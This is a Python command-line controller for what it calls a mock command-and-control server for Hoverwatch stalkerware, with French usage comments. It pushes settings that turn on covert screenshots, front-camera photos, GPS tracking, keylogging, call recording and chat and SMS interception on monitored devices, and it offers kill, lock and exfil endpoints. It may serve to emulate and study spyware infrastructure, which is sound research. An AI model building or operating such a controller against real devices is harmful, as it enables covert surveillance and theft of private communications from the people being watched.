#!/usr/bin/env python3
"""
Hoverwatch Mock C2 — Remote Control CLI

Usage:
    uv run ctl.py screenshot              # activer screenshots
    uv run ctl.py screenshot --off        # désactiver
    uv run ctl.py photo                   # selfie
    uv run ctl.py location               # GPS
    uv run ctl.py keylog                  # keylogger
    uv run ctl.py callrec                 # enregistrement appels
    uv run ctl.py chat / sms             # interception
    uv run ctl.py sync --period 1        # intervalle sync
    uv run ctl.py on / off               # master switch
    uv run ctl.py kill [auth_key]        # kill switch
    uv run ctl.py status / devices / exfil
"""
import argparse, json, ssl, sys, urllib.request, urllib.error

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def call(base, method, path, data=None):
    url = base + path
    body = json.dumps(data).encode() if data else None
    hdrs = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5, context=CTX) as r:
            raw = r.read().decode()
            try: return json.loads(raw)
            except json.JSONDecodeError: return raw
    except urllib.error.URLError as e:
        print(f"Connexion echouee ({url}): {e}", file=sys.stderr)
        sys.exit(1)

def push(base, settings):
    result = call(base, "POST", "/admin/settings", settings)
    ver = result.get("new_settings", {}).get("version", "?") if isinstance(result, dict) else "?"
    print(f"Settings pushed (version={ver})")
    if isinstance(result, dict):
        print(json.dumps(result.get("new_settings", result), indent=2, ensure_ascii=False))

def pp(data):
    print(json.dumps(data, indent=2, ensure_ascii=False) if isinstance(data, dict) else data)

def main():
    p = argparse.ArgumentParser(description="Hoverwatch Mock C2 Control")
    p.add_argument("--base", default="https://localhost:8443")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("screenshot", aliases=["shot"]); s.add_argument("--period", type=int, default=1); s.add_argument("--off", action="store_true")
    s = sub.add_parser("photo"); s.add_argument("--off", action="store_true")
    s = sub.add_parser("location", aliases=["gps"]); s.add_argument("--period", type=int, default=1); s.add_argument("--acc", type=int, default=10); s.add_argument("--off", action="store_true")
    s = sub.add_parser("keylog"); s.add_argument("--off", action="store_true")
    s = sub.add_parser("callrec", aliases=["call"]); s.add_argument("--off", action="store_true")
    s = sub.add_parser("chat"); s.add_argument("--off", action="store_true")
    s = sub.add_parser("sms"); s.add_argument("--off", action="store_true")
    s = sub.add_parser("sync"); s.add_argument("--period", type=int, default=1)
    sub.add_parser("on"); sub.add_parser("off")
    s = sub.add_parser("kill"); s.add_argument("auth_key", nargs="?")
    s = sub.add_parser("lock"); s.add_argument("auth_key")
    s = sub.add_parser("ban"); s.add_argument("auth_key")
    s = sub.add_parser("clear"); s.add_argument("auth_key")
    sub.add_parser("status"); sub.add_parser("devices"); sub.add_parser("exfil")

    a = p.parse_args()
    b = a.base

    match a.cmd:
        case "screenshot" | "shot":  push(b, {"shot": {"on": not a.off, "period": a.period}})
        case "photo":                push(b, {"frcam": {"on": not a.off, "photo": not a.off}})
        case "location" | "gps":     push(b, {"location": {"on": not a.off, "period": a.period, "acc": a.acc, "gps": True}})
        case "keylog":               push(b, {"keys": {"on": not a.off}})
        case "callrec" | "call":     push(b, {"call": {"on": not a.off, "rec": not a.off, "quality": 1, "source": 4, "codec": 2}})
        case "chat":                 push(b, {"chat": {"on": not a.off}})
        case "sms":                  push(b, {"sms": {"on": not a.off}})
        case "sync":                 push(b, {"period": a.period})
        case "on":                   push(b, {"on": True})
        case "off":                  push(b, {"on": False})
        case "kill":
            if not a.auth_key:
                print("Devices:"); pp(call(b, "GET", "/devices")); return
            pp(call(b, "POST", f"/admin/kill/{a.auth_key}"))
        case "lock":    pp(call(b, "POST", f"/admin/lock/{a.auth_key}"))
        case "ban":     pp(call(b, "POST", f"/admin/ban/{a.auth_key}"))
        case "clear":   pp(call(b, "POST", f"/admin/clear/{a.auth_key}"))
        case "status":  pp(call(b, "GET", "/"))
        case "devices": pp(call(b, "GET", "/devices"))
        case "exfil":   pp(call(b, "GET", "/exfil"))

if __name__ == "__main__":
    main()
